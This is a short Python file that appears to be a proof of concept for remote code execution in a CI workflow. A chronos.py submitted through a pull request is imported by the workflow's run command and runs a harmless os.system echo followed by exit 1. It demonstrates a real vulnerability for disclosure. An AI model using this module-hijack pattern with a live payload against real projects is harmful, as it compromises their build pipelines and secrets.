# ./chronos.py
import os
import sys

print(">>> PoC RCE: Malicious chronos.py from PR is being imported/executed <<<")
print(f">>> Current working directory: {os.getcwd()}")
print(f">>> Python sys.path[0]: {sys.path[0]}") # Often the script's directory

# This is the safe payload demonstrating control
os.system("echo '>>> VULNERABLE: Arbitrary command (echo) executed from PR code. <<<'; exit 1")

# The 'exit 1' above will cause the 'python run.py chronos ...' command in the workflow to fail,
# preventing any further (potentially real) benchmark execution.
# This ensures the PoC is safe and non-disruptive beyond demonstrating the vulnerability.
